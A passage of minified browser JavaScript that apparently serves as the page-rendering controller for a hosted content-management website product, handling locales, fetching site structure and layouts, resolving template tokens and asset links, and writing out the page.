"use strict";var SCS=window.SCS||{};SCS.sitePrefix=SCS.sitePrefix||"/",SCS.data={pageId:null,siteInfo:null,structure:null,structurePages:null,basePageModel:null,baseSlotReuseModel:null,pageModel:null,pageLayout:null,mobileLayout:null,navMap:{},navRoot:null,placeholderContent:null,isSecureSite:SCS.sitePrefix.indexOf("/authsite/")>=0||window.location.pathname.indexOf("/authsite/")>=0,startProgressTimer:null,pageTimeoutTimer:null},SCS.performance={timers:{}},SCS.xmlhttp=new XMLHttpRequest,Array.isArray||(Array.isArray=function(e){return"[object Array]"===Object.prototype.toString.call(e)}),String.prototype.trim||(String.prototype.trim=function(){return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")}),String.prototype.startsWith||(String.prototype.startsWith=function(e,t){return t=t||0,this.substr(t,e.length)===e}),SCS.preInitRendering=SCS.preInitRendering||function(){},SCS.initRendering=function(){this.data.startProgressTimer=setTimeout(this.onStartProgress,2500),this.data.pageTimeoutTimer=setTimeout(this.onPageTimeout,3e4),this.setCacheKeys(),this.processSitePrefix(),this.isPrerenderEnvironment()&&this.addMetaTag("prerender-site-prefix",this.sitePrefix),this.data.pageLocale?this.getLocaleSiteStructure():this.getSiteStructure(this.processSiteStructure,this.processSiteStructureFetchError)},SCS.isValidLocale=function(e){return-1!==["af","sq","am","ar","ar-DZ","ar-BH","ar-EG","ar-IQ","ar-JO","ar-KW","ar-LB","ar-LY","ar-MA","ar-OM","ar-QA","ar-SA","ar-SY","ar-TN","ar-AE","ar-YE","hy","as","az","az-AZ","az-Cyrl-AZ","az-Latn-AZ","eu","be","bn","bs","bg","my","ca","zh","zh-CN","zh-HK","zh-MO","zh-SG","zh-TW","hr","cs","da","dv","nl","nl-BE","nl-NL","en","en-CB","en-AU","en-BZ","en-CA","en-IN","en-IE","en-JM","en-NZ","en-PH","en-ZA","en-TT","en-GB","en-US","et","fo","fi","fr","fr-BE","fr-CA","fr-FR","fr-LU","fr-CH","gl","ka","de","de-AT","de-DE","de-LI","de-LU","de-CH","el","gn","gu","he","hi","hu","is","id","it","it-IT","it-CH","ja","kn","ks","kk","km","ko","lo","la","lv","lt","mk","ms","ms-BN","ms-MY","ml","mt","mi","mr","mn","ne","zxx","no","no-NO","nb","nn","or","pa","fa","pl","pt","pt-BR","pt-PT","rm","ro","ro-MO","ru","ru-MO","sa","gd","gd-IE","sr","sr-SP","sr-RS","sr-Cyrl-RS","sr-Latn-RS","sd","si","sk","sl","so","es","es-AR","es-BO","es-CL","es-CO","es-CR","es-DO","es-EC","es-SV","es-GT","es-HN","es-MX","es-NI","es-PA","es-PY","es-PE","es-PR","es-ES","es-UY","es-VE","sw","sv","sv-FI","sv-SE","tg","ta","tt","te","th","bo","ts","tn","tr","tk","uk","und","ur","uz","uz-UZ","uz-Cyrl-UZ","uz-Latn-UZ","vi","cy","xh","yi","zu"].indexOf(function(e){return e.replace(/-x-.*/,"")}(e))||"root"===e},SCS.processSitePrefix=SCS.processSitePrefix||function(e){if(e=e||window.location.pathname,e=decodeURI(e)){if(e.startsWith("/mobileauthsite/")&&this.sitePrefix.startsWith("/authsite/")&&(this.sitePrefix=this.sitePrefix.replace("/authsite/","/mobileauthsite/")),this.vanitySitePrefixes&&Array.isArray(this.vanitySitePrefixes)&&this.vanitySitePrefixes.length>0&&!e.startsWith(this.sitePrefix)&&e!==this.sitePrefix.slice(0,-1)&&!SCS.sitePrefixResolved)for(var t=0;t<this.vanitySitePrefixes.length;t++){var s=this.vanitySitePrefixes[t];if(s&&"string"==typeof s&&s.startsWith("/")&&"/"===s.slice(-1)&&(e.startsWith(s)||e===s.slice(0,-1))){SCS.sitePrefix=s;break}}e.startsWith(this.sitePrefix)||e!==this.sitePrefix.substring(0,this.sitePrefix.length-1)&&(this.sitePrefix="/");var a,r=e.replace(this.sitePrefix,""),i=r&&r.split("/")[0];if(i&&this.localeAliases){for(var n in this.localeAliasMap={},this.localeAliases)Object.prototype.hasOwnProperty.call(this.localeAliases,n)&&(this.localeAliasMap[this.localeAliases[n]]=n);this.localeAliases[i]&&(a=i,i=this.localeAliases[a])}if(i&&SCS.isValidLocale(i)){if(!a&&this.localeAliasMap&&this.localeAliasMap[i]&&i!==this.localeAliasMap[i]){a=this.localeAliasMap[i];var o=e.replace(this.sitePrefix+i,this.sitePrefix+a);return void this.redirectToUrl(this.getRedirectUrl(o))}this.data.locale=i,this.data.localeAlias=a,"root"!==i&&(this.data.pageLocale=i)}}},SCS.setCacheKeys=SCS.setCacheKeys||function(e){var t={product:(e=e||window.SCSCacheKeys||{}).product||"",site:e.site||"",theme:e.theme||"",component:e.component||"",caas:e.caas||""};SCS.cacheKeys=t},SCS.onStartProgress=function(){var e=document.getElementById("scsWaitImage");e&&(e.style.display="block")},SCS.onPageTimeout=function(){SCS.clearWaitImage()},SCS.clearWaitImage=function(){var e=document.getElementById("scsWaitImage");e&&(e.style.display="none")},SCS.clearTimers=function(){null!==this.data.pageTimeoutTimer&&(window.clearTimeout(this.data.pageTimeoutTimer),this.data.pageTimeoutTimer=null),null!==this.data.startProgressTimer&&(window.clearTimeout(this.data.startProgressTimer),this.data.startProgressTimer=null)},SCS.onRenderError=function(e){this.clearTimers(),this.clearWaitImage(),this.logError(e)},SCS.logError=function(e){try{e&&window.console&&window.console.error?window.console.error(e):e&&window.console&&window.console.log&&window.console.log(e)}catch(e){}},SCS.parseJson=function(e){var t=null;try{t=JSON.parse(e)}catch(t){throw this.onRenderError("Failed to parse JSON: "+e+" Message: "+t.message),t}return t},SCS.encodeHTML=function(e){var t={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","/":"&#x2F;"};return e.replace(/[&"<>'/]/g,(function(e){return t[e]}))},SCS.getProductUrl=function(e){var t=!1!==(e=e||{}).useCacheKeys&&SCS.cacheKeys.product?SCS.cacheKeys.product:"",s=t?"/"+SCS.cacheKeys.product:"",a=t?SCS.cacheKeys.product+"/":"",r=e.useSharedUrl?"/_sitesclouddelivery"+s:this.sitePrefix+a+"_sitesclouddelivery";return SCS.sitesCloudCDN&&"string"==typeof SCS.sitesCloudCDN&&!1!==e.useCDN&&(r=SCS.sitesCloudCDN+"/_sitesclouddelivery"),r},SCS.getPageLayout=function(e){if(e){var t=SCS.cacheKeys.theme?SCS.cacheKeys.theme+"/":"",s=SCS.sitePrefix+t+"_themesdelivery/"+encodeURIComponent(this.data.siteInfo.properties.themeName)+"/layouts/"+encodeURIComponent(e);SCS.performance.startTimer("GET layout"),this.callService(s,this.processPageLayout,this.processPageLayout)}else this.onRenderError("A page layout was not specified in the page model.")},SCS.tokenMap={SCS_SITE_HEADER:"siteInfo.properties.header",SCS_SITE_FOOTER:"siteInfo.properties.footer",SCS_SITE_DESCRIPTION:"siteInfo.properties.description",SCS_SITE_KEYWORDS:"siteInfo.properties.keywords",SCS_PAGE_HEADER:"pageModel.properties.header",SCS_PAGE_FOOTER:"pageModel.properties.footer",SCS_PAGE_TITLE:"pageModel.properties.title",SCS_PAGE_DESCRIPTION:"pageModel.properties.pageDescription",SCS_PAGE_KEYWORDS:"pageModel.properties.keywords",SCS_PAGE_NAME:"pageStructureData.name",SCS_PAGE_URL:"pageStructureData.pageUrl"},SCS.getTokenValue=function(e,t){var s="";if(e&&"string"==typeof e){for(var a=this.tokenMap[e].split("."),r=t,i=0;i<a.length-1;i++){if(!r[a[i]]||"object"!=typeof r[a[i]]){r=null;break}r=r[a[i]]}r&&(s="string"==typeof r[a[a.length-1]]?r[a[a.length-1]]:"")}return s},SCS.processPageLayout=function(e,t,s){if(s=s||document,SCS.performance.stopTimer("GET layout"),!t||200!=e.status||"string"!=typeof t||t.search(/id=(["'])scsControllerBody\1/g)>=0){var a=this.getErrorPageId();this.data.isRenderingErrorPage||null===a?this.onRenderError("The page layout could not be obtained from the server."):(this.data.isRenderingErrorPage=!0,this.data.pageId=a,this.fetchPageData())}else{t=this.preFillPageLayout(t);var r,i=this.data.pageId&&"string"==typeof this.data.pageId?parseInt(this.data.pageId):this.data.pageId;this.data.navMap&&i&&this.data.navMap[i]&&(this.data.pageStructureData=this.data.navMap[i]);var n=this;for(var o in this.tokenMap)Object.prototype.hasOwnProperty.call(this.tokenMap,o)&&(r=new RegExp("(\x3c!--\\$\\s*"+o+"\\s*--\x3e)|(\\[!--\\$\\s*"+o+"\\s*--\\])","g"),t=t.replace(r,(function(){return n.getTokenValue(o,n.data)})));var c=SCS.cacheKeys.theme?SCS.cacheKeys.theme+"/":"";SCS.cacheKeys.product&&SCS.cacheKeys.product,t=(t=(t=t.replace(/(["'])\/_sitescloud(\/renderer\/require\.js)/g,"$1"+this.getProductUrl({useCDN:!SCS.useSharedRequireJS&&!SCS.useOriginalRequireJS,useSharedUrl:SCS.useSharedRequireJS})+"$2")).replace(/(["'])\/_sitescloud\//g,"$1"+this.getProductUrl()+"/")).replace(/(["'])\/_themes\//g,"$1"+this.sitePrefix+c+"_themesdelivery/"),t=this.resolveLinks(t),t=this.applySlotReuseData(t);var l=this.getPageModelStyleMarkup();l&&(t=t.replace(/(\s+|>)(<\/head\s*>(?:\s+|<))/i,(function(e,t,s){var a=t+l+s;return l="",a})));var S=this.getWebAnalyticsMarkup()||"",h=!1;t=t.replace(/(<!--\$\s*SCS_WEB_ANALYTICS_SCRIPT\s*-->)|(\[!--\$\s*SCS_WEB_ANALYTICS_SCRIPT\s*--\])/g,(function(e,t,s){return h=!0,S})),S&&!h&&(t=t.replace(/(\s+|>)(<\/head\s*>(?:\s+|<))/i,(function(e,t,s){return t+S+s}))),t=this.injectWyciwygCacheBuster(t),this.isPrerenderEnvironment()&&(t=this.injectMarkupInHead(t,'<meta name="prerender-site-prefix" content="'+this.sitePrefix+'">'),this.data.isRendering404Condition&&(t=this.injectMarkupInHead(t,'<meta name="prerender-status-code" content="404">'))),SCS.performance.stopTimer("CONTROLLER"),SCS.performance.startTimer("WriteLayout");var d={siteId:this.data.siteInfo&&this.data.siteInfo.properties&&this.data.siteInfo.properties.siteName?this.data.siteInfo.properties.siteName:null,sitePrefix:this.sitePrefix,pageModel:this.data.pageModel,localePageModel:this.data.localePageModel,pageLanguageCode:this.data.pageLocale,navigationRoot:this.data.navRoot,navigationCurr:i,structureMap:this.data.navMap,siteInfo:this.data.siteInfo,placeholderContent:this.data.placeholderContent,deviceInfo:SCS.getDeviceInfo(),sitesCloudCDN:"string"==typeof SCS.sitesCloudCDN&&SCS.sitesCloudCDN||"",performance:{timers:SCS.performance.timers},cacheKeys:this.cacheKeys};this.data.localeAlias&&(d.localeAlias=this.data.localeAlias),!0===SCS.isAssetAnalyticsEnabled&&(d.isAssetAnalyticsEnabled=!0,d.assetAnalyticsAccount=SCS.assetAnalyticsAccount||"",d.serviceId=SCS.serviceId||""),"string"==typeof SCS.podPlatform&&(d.podPlatform=SCS.podPlatform);var p=JSON.stringify(d),u="";u+='<script id="scsRenderInfo" type="application/json">',u+=this.encodeHTML(p),u+="<\/script>",u+='\n<script id="scsRenderObject" type="text/javascript">var require = {waitSeconds: 0};<\/script>',u+=l,r=/(<!--\$\s*SCS_RENDER_INFO\s*-->)|(\[!--\$\s*SCS_RENDER_INFO\s*--\])/g,t=t.replace(r,(function(){return u})),this.clearTimers(),this.clearWaitImage(),this.writeLayout(t,s)}},SCS.writeLayout=function(e,t){SCS={},t.open("text/html","replace"),t.write(e),t.close()},SCS.preFillPageLayout=SCS.preFillPageLayout||function(e){var t,s,a,r,i,n,o,c,l,S,h,d=e,p=this.data.pageModel,u=this.data.localePageModel||{};if(p&&p.componentInstances)for(S in i=p.componentInstances)if(i.hasOwnProperty(S)&&"object"==typeof i[S]&&(n=i[S],c=u.componentInstances&&u.componentInstances[S]||{},n&&(o=n.data,l=c.data||{},r="string"==typeof n.type&&0===n.type.indexOf("scs-inline-")))){if(o&&"string"==typeof o.innerHTML){var g=l.innerHTML||o.innerHTML;s=r?"":'<div class="scs-component-bounding-box">',a=r?"":"</div>","string"==typeof(t=this.replaceTagContent(d,S,s+g+a))&&(d=t,n.preRenderedByController=!0)}(h=this.getComponentAttributes(o,l))&&"object"==typeof h&&(d=this.replaceTagAttributes(d,S,h),n.preRenderedByController=!0)}return d},SCS.getComponentAttributes=function(e,t){var s,a,r,i={},o=t||{};if(e&&"object"==typeof e)for(a in e)"attr_"==a.substring(0,5)&&(r=a.substring(5))&&(i[r]=o[a]||e[a],s=i);return s},SCS.replaceTagAttributes=function(e,t,s){var a,r,i,n,o,c,l,S,h,d=e,p="(<\\w+\\s+)[^>]*[Ii][Dd]=([\"']?)"+t+"\\2(>|[^>]*)>",u={},g="",f="";try{if(e&&t&&Object.keys(s).length>0&&(h=(i=new RegExp(p,"g")).exec(e))){for(f in a=h.index,r=i.lastIndex,S="/"==(n=e.substring(a,r))[n.length-2],o=h[1],c=S?"/>":">",l=n.substring(o.length,n.length-c.length),u=SCS.parseTagAttributes(l),s)u[f]=s[f];for(f in g="",u)void 0===u[f]?g+=f+" ":g+=f+'="'+u[f]+'" ';d=e.substring(0,a+o.length),d+=g,d+=e.substring(a+o.length+l.length)}}catch(e){SCS.logError("Failed to replace attributes: "+e.message)}return d},SCS.parseTagAttributes=function(e){for(var t={},s="",a="",r="",i="",n=e.length,o=0,c=0;c>=0&&c<n;){for(;c<n&&" "==(r=e.charAt(c));c++);if(c==n)break;for(o=c;c<n&&" "!=(r=e.charAt(c))&&"="!=r;c++);for(s=e.substr(o,c-o);c<n&&" "==(r=e.charAt(c));c++);if("="==r){for(c+=1;c<n&&" "==(r=e.charAt(c));c++);for("'"==r||'"'==r?(i=r,c+=1):i=" ",o=c;c<n&&(r=e.charAt(c))!=i;c++);a=e.substr(o,c-o),t[s]=a,c++}else t[s]=void 0,o=c}return t},SCS.replaceTagContent=function(e,t,s,a){var r,i,n,o,c,l=null;a=a||{};try{(c=(o=new RegExp("<(\\w+)\\s+[^>]*[Ii][Dd]=([\"']?)"+t+"\\2(>|[^>]*)>","g")).exec(e))&&(c.index,r=o.lastIndex,n=c[1],(i=this.findEndTag(e,n,r))>=0&&(l=e.substring(0,a.append?i:r),l+=s,l+=e.substring(i)))}catch(e){SCS.logError("Failed to replace content: "+e.message)}return l},SCS.findEndTag=function(e,t,s){var a,r,i,n,o=-1;try{if((a=new RegExp("</"+t+"\\s*>","gi")).lastIndex=s,r=a.exec(e)){o=r.index,(i=new RegExp("<"+t+"\\s*>","gi")).lastIndex=s;do{if(n=i.exec(e)){if(n.index>o)break;(r=a.exec(e))&&(o=r.index)}}while(n&&r)}}catch(e){SCS.logError("Failed to find end tag: "+e.message)}return o},SCS.injectWyciwygCacheBuster=function(e){var t=e;return"number"==typeof window.mozInnerScreenX&&(t=this.injectMarkupInHead(t,'<script type="text/javascript">\nif( 0 === document.URL.indexOf("wyciwyg://") ) { \nwindow.location.replace( window.location.href ); }\n<\/script>')),t},SCS.injectMarkupInHead=function(e,t){var s,a=e,r=/<head(?:\s+[^>]*?)?>/gi.exec(e);return r&&r[0]&&(s=r.index+r[0].length,a=e.substr(0,s),a+="\n",a+=t,a+=e.substr(s)),a},SCS.addMetaTag=function(e,t,s){if(s=s||"name",e&&"string"==typeof e&&e.length>0&&s&&"string"==typeof s&&s.length>0&&t&&"string"==typeof t){var a=document.getElementsByTagName("head");if(a&&a.length>0&&a[0]){var r=document.createElement("meta");r.setAttribute(s,e),r.content=t,a[0].appendChild(r)}}},SCS.getPageModelStyleMarkup=function(){var e,t,s,a,r="";try{for(s in e=this.data.pageModel.properties.styles,r+=this.getStyleMarkup("scs-styles-body","body",e),this.data.pageModel.slots)t=this.data.pageModel.slots[s],a=this.data.pageModel.componentInstances,r+=this.getContainerStyleMarkup(s,t,a,!0)}catch(e){r=""}return r.length>0&&(r='\n<style id="scsPageStyles" type="text/css">'+r+"\n</style>"),r},SCS.getContainerStyleMarkup=function(e,t,s,a){var r,i,n,o,c,l,S="";if(t&&(r=t.styles,o=a?"scs-slot-styles-":"scs-container-styles-",c=this.encodeHTML("#"+e)+(a?"":" > .scs-container-styles > .scs-component-content"),S+=this.getStyleMarkup(o+e,c,r),t.components&&Array.isArray(t.components)))for(l=0;l<t.components.length;l++)"object"==typeof s[i=t.components[l]]&&("scs-componentgroup"!==(n=s[i]).type&&"scs-sectionlayout"!==n.type||(S+=this.getContainerStyleMarkup(i,n.data,s,!1)));return S},SCS.getStyleMarkup=function(e,t,s){var a,r,i,n,o,c="";if(Array.isArray(s)&&s.length>0){for(c+="\n"+t+" {",r=0;r<s.length;r++)if("string"==typeof(a=s[r])&&(i=a.indexOf(":"))>=0){if(n=a.substring(0,i).trim(),o=a.substring(i+1).trim(),SCS.getDeviceInfo().isIOS&&"background-attachment"===n&&"fixed"===o)continue;n.indexOf(">")<0&&n.indexOf("<")<0&&o.indexOf(">")<0&&o.indexOf("<")<0&&(o=o.replace(/url\(\s*"\[!--\$SCS_CONTENT_URL--\]\/([^"]+)"\s*\)/g,(function(e,t){return'url("[!--$SCS_CONTENT_URL--]/'+encodeURIComponent(t)+'")'})),c+="\n"+n+": "+(o=this.resolveLinks(o))+";")}c+="\n}"}return c},SCS.getWebAnalyticsMarkup=function(){var e=null,t=this.data.pageModel,s=this.data.siteInfo;return t&&t.properties&&!0===t.properties.overrideWebAnalytics?e=t.properties.webAnalyticsScript:s&&s.properties&&!0===s.properties.isWebAnalyticsEnabled&&(e=s.properties.webAnalyticsScript),e},SCS.applySlotReuseData=function(e){var t=this.getIdentifiedSlotIds(e);return this.fixupPageModelWithSlotReuseData(t.slotIds),t.pageLayout},SCS.getIdentifiedSlotIds=function(e){var t,s,a,r,i,n,o;if(e=e.replace(/<!--\s*SCS Layout Information:\s*(\{[\s\S]*?\})\s*-->/,(function(e,s){try{var a=JSON.parse(s);t=a.slotIds}catch(e){}return""})),!Array.isArray(t)&&(t=[],a=/<\w+\s+[^>]*?[Cc][Ll][Aa][Ss][Ss]\s*=\s*(['"])(?:\s*|[^>'"]*?\s+)scs-slot(?:\s*\1|\s+[^>'"]*?\1)[^>]*?>/g,s=e.match(a)))for(i=/\s+id\s*=\s*(['"])([^'">]+)\1(?:\s+|\/?>)/i,o=0;o<s.length;o++)(r=s[o].match(i))&&(n=r[2])&&t.push(n);return{pageLayout:e,slotIds:t}},SCS.fixupPageModelWithSlotReuseData=function(e){var t,s,a,r,i,n=this.data.pageModel,o=this.data.baseSlotReuseModel;if(o&&e)for(i=0;i<e.length;i++)if("object"==typeof o[t=e[i]]&&"object"==typeof o[t].base&&o[t].base.site&&"object"==typeof o[t].base.site&&(s=JSON.parse(JSON.stringify(o[t].base.site)),n.slots[t]=s,s.componentInstances)){for(a in s.componentInstances)r=JSON.parse(JSON.stringify(s.componentInstances[a])),n.componentInstances[a]=r;delete s.componentInstances}},SCS.callService=function(e,t,s){if(this.xmlhttp.onreadystatechange=function(){var a;if(4==this.readyState)if(200==this.status)a=""+this.responseText,t.call(SCS,this,a);else if(s)a=""+this.responseText,s.call(SCS,this,a);else{try{a=""+this.responseText}catch(e){}SCS.onRenderError("Status "+this.status+" returned from "+e+" with response: "+a)}},this.xmlhttp.open("GET",e,!0),window&&function(e){var t=!1;try{window&&"false"!==window.localStorage.getItem("APICallerTracking")&&(t=new URL(e,window.location.href).origin===window.location.origin)}catch(e){console.log(e)}return t}(e)){var a=this.getAppKeyHeaderValue();this.xmlhttp.setRequestHeader("X-Oracle-Ocm-App-Key",a)}this.xmlhttp.send()},SCS.getAppKeyHeaderValue=function(){var e="o:9aa0cf148cef44caa4c3ea7282314f3d";if(this.isPrerenderEnvironment())e="o:efe499ac4ef4455cacc0d3d3f6036e0b";else{var t=this.data.siteInfo&&this.data.siteInfo.properties&&this.data.siteInfo.properties.siteRootPrefix;(t?-1!==t.indexOf("/authsite/"):this.data.isSecureSite)&&(e="o:09f435a1ab054cbd85f50f9a38aa4092")}return e},SCS.resolveLinks=function(e){var t=e;"object"==typeof e&&(t=JSON.stringify(e));for(var s=this,a=(SCS.cacheKeys.product&&SCS.cacheKeys.product,SCS.cacheKeys.site?SCS.cacheKeys.site+"/":""),r=SCS.cacheKeys.theme?SCS.cacheKeys.theme+"/":"",i=SCS.cacheKeys.component?SCS.cacheKeys.component+"/":"",n=SCS.cacheKeys.caas?"?cb="+SCS.cacheKeys.caas:"",o=s.data.siteInfo.properties.channelAccessTokens||[],c="",l=0;l<o.length;l++){var S=o[l];if("defaultToken"===S.name){c=(n?"&":"?")+"channelToken="+S.value;break}}var h=s.data.siteInfo.properties.siteRootPrefix;h&&h.indexOf("/authsite/"),t=(t=(t=(t=(t=(t=(t=(t=(t=(t=(t=t.replace(/(<!--\$\s*SCS_CONTENT_URL\s*-->)|(\[!--\$\s*SCS_CONTENT_URL\s*--\])/g,(function(){return SCS.sitePrefix+a+"content"}))).replace(/(<!--\$\s*SCS_COMP_CATALOG_URL\s*-->)|(\[!--\$\s*SCS_COMP_CATALOG_URL\s*--\])/g,(function(){return SCS.sitePrefix+i+"_compdelivery"}))).replace(/(<!--\$\s*SCS_DIST_FOLDER\s*-->)|(\[!--\$\s*SCS_DIST_FOLDER\s*--\])/g,(function(){return SCS.getProductUrl()}))).replace(/(<!--\$\s*SCS_DIST_IMG_FOLDER\s*-->)|(\[!--\$\s*SCS_DIST_IMG_FOLDER\s*--\])/g,(function(){return SCS.getProductUrl()+"/renderer"}))).replace(/(<!--\$\s*SCS_RENDERER_PATH\s*-->)|(\[!--\$\s*SCS_RENDERER_PATH\s*--\])/g,(function(){return SCS.getProductUrl()+"/renderer"}))).replace(/(<!--\$\s*SCS_SITE_PATH\s*-->)|(\[!--\$\s*SCS_SITE_PATH\s*--\])/g,(function(){return(SCS.sitePrefix+a).replace(/\/+$/,(function(){return""}))}))).replace(/(_scs_theme_root_)/g,(function(){return SCS.sitePrefix+r+"_themesdelivery/"+encodeURIComponent(s.data.siteInfo.properties.themeName)}))).replace(/(_scs_design_name_)/g,(function(){return encodeURIComponent(s.data.siteInfo.properties.designName||"default")}))).replace(/(<!--\$\s*SCS_THEME_NAME\s*-->)|(\[!--\$\s*SCS_THEME_NAME\s*--\])/g,(function(){return encodeURIComponent(s.data.siteInfo.properties.themeName)}))).replace(/(<!--\$\s*SCS_DESIGN_NAME\s*-->)|(\[!--\$\s*SCS_DESIGN_NAME\s*--\])/g,(function(){return encodeURIComponent(s.data.siteInfo.properties.designName||"default")}))).replace(/\[!--\$\s*SCS_PAGE\s*--\]\s*(.*?)\s*\[\/!--\$\s*SCS_PAGE\s*--\]/g,(function(e,t){var s,a=SCS.getPageLinkData(t);return a&&"string"==typeof a.href&&(s=a.href),s}));var d=function(e){var t=e.split(","),s=t[0].trim(),a=t.length>1?t[1].trim():"",r=t.length>2?t[2].trim():"",i=a&&r?s+"/"+a+n+c+(n||c?"&":"?")+"format="+r:s+"/native"+n+c;return t.length>3&&/^(true|1)/i.test(t[3].trim())&&(i+=i.indexOf("?")<0?"?":"&",i+="download=true"),i};return t=(t=(t=(t=t.replace(/\[!--\$\s*SCS_DIGITAL_ASSET\s*--\]\s*(.*?)\s*\[\/!--\$\s*SCS_DIGITAL_ASSET\s*--\]/g,(function(e,t){return"/content/published/api/v1.1/assets/"+d(t)}))).replace(/\[!--\$\s*SCS_DIGITAL_ASSET_PUBLISHED\s*--\]\s*(.*?)\s*\[\/!--\$\s*SCS_DIGITAL_ASSET_PUBLISHED\s*--\]/g,(function(e,t){return"/content/published/api/v1.1/assets/"+d(t)}))).replace(/\[!--\$SCS_TEL--\]*(.*?) *\[\/!--\$SCS_TEL--\]/g,(function(e,t){return"tel:"+encodeURI(t)}))).replace(/<!--\s*SCS View Mode:([\s\S]*?)-->/g,(function(e,t){return t})),"object"==typeof e&&(t=JSON.parse(t)),t},SCS.getPageLinkData=function(e){var t,s,a=!1,r=null,i=this.data.navMap,n="";if(i&&("number"==typeof e||"string"==typeof e&&e)){var o=i[e];if(o){if("string"==typeof o.linkUrl&&o.linkUrl.trim().length>0)t=o.linkUrl.trim(),"string"==typeof o.linkTarget&&(n=o.linkTarget.trim());else if(r=o.pageUrl){var c=this.data.localeAlias||this.data.pageLocale;if(c){var l=this.combineUrlSegments(this.sitePrefix,c);t=this.combineUrlSegments(l,r)}else t=this.combineUrlSegments(this.sitePrefix,r)}a=!0===o.hideInNavigation}}return t&&(s={href:t,target:n,hideInNavigation:a}),s},SCS.combineUrlSegments=function(e,t){var s="";return"string"==typeof e&&"string"==typeof t&&e.length>0&&t.length>0&&(s="/"==e.charAt(e.length-1)&&"/"==t.charAt(0)?e+t.substring(1):"/"==e.charAt(e.length-1)&&"/"!=t.charAt(0)||"/"!=e.charAt(e.length-1)&&"/"==t.charAt(0)?e+t:e+"/"+t),s},SCS.getLocaleSiteStructure=function(){var e=SCS.cacheKeys.site?SCS.cacheKeys.site+"/":"",t=SCS.sitePrefix+e+this.data.pageLocale+"_structure.json";SCS.performance.startTimer("GET structure.json"),this.callService(t,this.processLocaleSiteStructure,this.processNoLocaleSiteStructure)},SCS.processLocaleSiteStructure=function(e,t){var s,a=!1;try{var r=JSON.parse(t);a=!!(s=r&&r.siteInfo&&r.siteInfo.base)}catch(e){}if(a)if(this.isMlsSite(s)){var i=e.getResponseHeader("X-OCM-Locale-Fallback");i&&"string"==typeof i&&(this.data.localeAlias=this.data.localeAlias||this.data.pageLocale,this.data.pageLocale=i,this.data.locale=i),-1!==(s.properties&&s.properties.availableLanguages||[]).indexOf(this.data.pageLocale)?this.processSiteStructure(e,t):this.processSiteStructureRedirect(e,t)}else this.processSiteStructure(e,t);else this.processNoLocaleSiteStructure()},SCS.processNoLocaleSiteStructure=function(){SCS.getSiteStructure(this.processSiteStructureRedirect,this.processSiteStructureFetchError)},SCS.processSiteStructureRedirect=function(e,t){var s=this.parseJson(t),a=s.siteInfo&&s.siteInfo.base,r=this.getDefaultLanguage(a);if(this.isMlsSite(a)&&r&&this.data.pageLocale!==r){var i=window.location.pathname,n=this.localeAliasMap&&this.localeAliasMap[r],o=this.sitePrefix+i.replace(this.sitePrefix,"").replace(this.data.localeAlias||this.data.pageLocale,n||r);this.redirectToUrl(this.getRedirectUrl(o))}else delete this.data.locale,delete this.data.pageLocale,delete this.data.localeAlias,this.processSiteStructure(e,t)},SCS.getSiteStructure=function(e,t){var s=SCS.cacheKeys.site?SCS.cacheKeys.site+"/":"",a=SCS.sitePrefix+s+"structure.json";SCS.performance.startTimer("GET structure.json"),this.callService(a,e,t)},SCS.processSiteStructureFetchError=function(e,t){404===e.status?this.onRenderError("The site structure could not be found.  This may be caused by a mismatched sitePrefix in the controller."):this.onRenderError("The site structure could not be obtained.")},SCS.getDefaultLanguage=function(e){var t=e||this.data.siteInfo;return t&&t.properties&&t.properties.defaultLanguage},SCS.isMlsSite=function(e){return!!this.getDefaultLanguage(e)},SCS.processSiteStructure=function(e,t){SCS.performance.stopTimer("GET structure.json");var s=this.parseJson(t);this.data.structure=s;var a=s.siteInfo;a&&(this.data.siteInfo=a.base),this.produceSiteNavigationStructure()},SCS.produceSiteNavigationStructure=function(){var e=this.data.structure.base&&this.data.structure.base.pages?this.data.structure.base.pages:[];this.data.structurePages=e;for(var t=this.data.structurePages||[],s=0;s<t.length;s++){var a=t[s];this.data.navMap[a.id]=a,null==a.parentId&&(this.data.navRoot=a.id)}this.getPageData()},SCS.getSlotReuseData=function(){var e=SCS.cacheKeys.site?SCS.cacheKeys.site+"/":"",t=SCS.sitePrefix+e+"slots.json";SCS.performance.startTimer("GET slots.json"),this.callService(t,this.processSlotReuseData)},SCS.processSlotReuseData=function(e,t){SCS.performance.stopTimer("GET slots.json");try{if(!t||200!=e.status||"string"!=typeof t||t.search(/id=(["'])scsControllerBody\1/g)>=0)throw"Invalid response received while fetching slot data.";var s=this.parseJson(t);this.data.baseSlotReuseModel=this.getEffectiveSlotReuseModel(s)}catch(e){this.data.baseSlotReuseModel=null}this.getPageData()},SCS.getPageData=function(e){e=e||window.location.pathname,e=decodeURI(e);try{var t=this.getPageId(e,"");if(!t&&this.isMlsSite()&&this.data.locale&&(t=this.getPageId(e,this.data.localeAlias||this.data.locale)),null==t&&null!==(t=this.getErrorPageId())&&(this.data.isRenderingErrorPage=!0,this.set404Condition({showErrorPage:!0})),null==t)return this.logError("The page could not be found in the site structure."),this.set404Condition({pageNotFound:!0}),void this.showErrorPage(404);this.data.pageId=t,this.fetchPageData(this.data.pageId)}catch(e){}},SCS.getPageId=function(e,t){var s,a=0,r=null,i=this.sitePrefix+t+"/";if(e){if(e===this.sitePrefix.substring(0,this.sitePrefix.length-1))throw this.redirectToUrl(this.getRedirectUrl(this.sitePrefix)),"URL redirect";if(t&&e===i.substring(0,i.length-1))throw this.redirectToUrl(this.getRedirectUrl(i)),"URL redirect";e=t&&0===e.indexOf(i)?e.replace(i,""):e.replace(this.sitePrefix,"")}for(a=0;a<this.data.structurePages.length;a++){if(e===this.data.structurePages[a].pageUrl){r=this.data.structurePages[a].id;break}s=s||!!this.data.structurePages[a].isDetailPage}return null==r&&0==e.length&&null!=this.data.navRoot&&(r=this.data.navRoot),null===r&&s&&(r=this.getDetailPageId(e)),r},SCS.getDetailPageId=function(e){var 